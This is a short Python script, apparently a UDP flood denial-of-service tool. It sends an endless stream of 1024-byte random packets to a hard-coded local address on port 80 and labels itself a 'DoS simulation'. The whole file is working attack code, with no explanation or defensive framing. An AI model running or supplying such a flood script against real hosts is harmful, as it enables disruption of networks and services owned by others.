import socket
import random

target_ip = "192.168.1.34"
target_port = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Starting DoS simulation...")

while True:

    payload = random._urandom(1024)

    sock.sendto(payload, (target_ip, target_port))